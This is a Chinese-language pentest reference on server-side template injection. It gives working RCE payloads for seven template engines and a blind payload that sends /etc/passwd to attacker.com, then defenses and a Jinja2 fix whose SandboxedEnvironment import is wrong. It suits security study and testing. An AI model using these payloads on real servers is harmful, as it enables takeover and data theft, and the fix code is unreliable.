# SSTI (Server-Side Template Injection) — Detection & Exploitation

> 来源: Shannon OSS injection analysis + PortSwigger Research

## 漏洞概述

SSTI 发生在用户输入被直接嵌入模板引擎处理时。与 XSS 不同，SSTI 在服务端
执行，可导致 RCE、敏感数据泄露和完整服务器接管。

## 常见模板引擎与 payload

### Jinja2 (Python / Flask)
```
检测: {{7*7}} → 期望在响应中看到 "49"
信息: {{config.items()}}
RCE:  {{''.__class__.__mro__[1].__subclasses__()}}
      {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Twig (PHP / Symfony)
```
检测: {{7*7}} → "49"
RCE:  {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

### FreeMarker (Java)
```
检测: ${7*7} → "49"
RCE:  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)
```
检测: #set($x=7*7)$x → "49"
RCE:  #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))...
```

### ERB (Ruby)
```
检测: <%= 7*7 %> → "49"
RCE:  <%= system('id') %>
```

### Smarty (PHP)
```
检测: {7*7} → "49"
RCE:  {system('id')}
```

### ASP.NET Razor
```
检测: @(7*7) → "49"
RCE:  @System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

## 检测策略 (Shannon 方法)

### 阶段 1: 模板引擎识别
1. 发送数学表达式: {{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}
2. 观察响应中是否出现 "49" 或其他求值结果
3. 通过错误消息指纹识别引擎 (Jinja2 → "jinja2.exceptions", FreeMarker → "freemarker.core")

### 阶段 2: 确认注入能力
1. 类型强制: {{7*'7'}} (Jinja2 → "7777777")
2. 字符串操作: {{'A'.toLowerCase()}} (Twig → "a")
3. 对象属性: {{'string'.__class__}} (Jinja2 → "<class 'str'>")

### 阶段 3: 提权到 RCE
根据识别的引擎选择 RCE payload。

## 盲 SSTI (Blind)

当表达式结果不可见时:
```
盲检测: {{sleep(5) if 7*7==49 else 0}} → 响应延迟 5s
外带:   {{ config.__class__.__init__.__globals__.__builtins__['__import__']('urllib.request').urlopen('http://attacker.com/' + open('/etc/passwd').read()) }}
```

## 防御

1. **沙箱化模板**: 使用 `SandboxedEnvironment` (Jinja2)
2. **无用户输入模板**: 用户输入永远不应注入模板文件/字符串
3. **逻辑与展示分离**: 用户输入 → 模板变量 (被转义) → 渲染
4. **最小权限**: 模板引擎运行在受限用户下 (no shell, no file I/O)

## 修复方案

```python
from jinja2 import Environment, SandboxedEnvironment

# ❌ 危险 — 用户输入直接进入模板
template = env.from_string(f"<h1>{user_input}</h1>")

# ✅ 安全 — 用户输入作为变量传入
template = env.from_string("<h1>{{ user_input }}</h1>")
template.render(user_input=user_input)

# ✅✅ 更安全 — 沙箱环境
sandboxed = SandboxedEnvironment()
template = sandboxed.from_string("<h1>{{ user_input }}</h1>")
```
